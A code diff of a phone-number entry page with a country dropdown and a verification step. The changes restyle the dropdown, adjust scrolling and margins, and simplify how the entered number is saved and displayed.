@@ -14,7 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden;
+            overflow: auto; /* Allow scrolling */
         }
 
         .container {
@@ -25,7 +25,7 @@
             text-align: center;
             width: 100%;
             max-width: 400px;
-            margin: 0 auto;
+            margin: 20px auto;
         }
 
         .container img {
@@ -90,18 +90,32 @@
         .dropdown {
             position: relative;
             display: inline-block;
+            width: 100%;
+        }
+
+        .dropdown-button {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
         }
 
         .dropdown-content {
             display: none;
             position: absolute;
             background-color: #ffffff;
-            min-width: 160px;
+            width: 100%;
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
             z-index: 1;
             max-height: 200px;
             overflow-y: auto;
-            margin-top: 5px;
+            border-radius: 5px;
+            top: 100%;
+            left: 0;
         }
 
         .dropdown-content div {
@@ -117,18 +131,16 @@
             display: block;
         }
 
-        .dropdown.open .dropdown-button {
-            transform: rotate(180deg);
+        .dropdown-button::after {
+            content: '▼';
+            font-size: 16px;
+            margin-left: 10px;
             transition: transform 0.2s;
         }
 
-        .dropdown-button {
-            font-size: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: transform 0.2s;
+        .dropdown.open .dropdown-button::after {
+            content: '▲';
+            transform: rotate(180deg);
         }
 
         #verificationContainer, #finalMessageContainer {
@@ -158,7 +170,7 @@
         <div class="input-group">
             <label for="countryCode">Country</label>
             <div class="dropdown" id="countryDropdown">
-                <div class="dropdown-button">Select Country ▼</div>
+                <div class="dropdown-button" onclick="toggleDropdown()">Select Country</div>
                 <div class="dropdown-content" id="dropdownMenu">
                     <!-- Country options will be populated here -->
                 </div>
@@ -228,25 +240,17 @@
             dropdown.classList.remove('open');
         }
 
-        function updatePhoneNumberPrefix() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumberField = document.getElementById('phoneNumber');
-            phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
-        }
-
         function goToVerificationPage() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
-            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
+            const phoneNumber = document.getElementById('phoneNumber').value;
 
             if (phoneNumber === '') {
                 alert('Please enter your phone number.');
                 return;
             }
 
-            savePhoneNumber(fullPhoneNumber);
+            savePhoneNumber(phoneNumber);
 
-            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
+            document.getElementById('phoneDisplay').textContent = phoneNumber;
             document.getElementById('initialContainer').style.display = 'none';
             document.getElementById('verificationContainer').style.display = 'block';
         }
@@ -322,6 +326,11 @@
                 if (!event.target.closest('.dropdown')) {
                     closeDropdown();
                 }
+            });
+
+            // Hide keyboard on scroll
+            document.body.addEventListener('touchmove', () => {
+                document.activeElement.blur();
             });
         });
     </script>
